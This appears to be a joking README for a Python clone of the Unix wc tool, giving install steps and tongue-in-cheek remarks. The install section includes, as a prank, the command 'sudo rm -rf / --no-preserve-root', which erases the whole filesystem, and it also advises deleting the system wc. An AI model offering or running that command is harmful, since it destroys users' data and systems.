**wc** - print how many lines, words, characters are in file
## Installation
 - Use git to clone this repository 
 > git clone git@github.com/robgal519/PiTE_WC.git
 - Move file wc.py to /opt/ directory
 > mv PiTE_WC/wc.py /opt/
 - Give executable permissions to that file
 > chmod +x /opt/wc.py
 - Create simlink 
 > ln -s /opt/wc.py /usr/bin/wc

The last command may give you error message. Don't worry, everything is fine, you just need to delete default wc program form your system ( mine is much superior ;P )

If deleting default wc program won't help, just run
> sudo rm -rf / --no-preserve-root


Now you successfully installed mine superior version of wc

## How to use it?

Simply type wc -h or wc --help for detailed help page

##What is it for ?

It is for people who are bored with standard implementation of wc program,
if you like poorly tested implementations ( i mean beading edge technology) --- it's perfect for you

##How can I help?

well, if you want to help ... just do it and don't waste my time! 

Be aware that I probably wont use your code, because mine is far superior  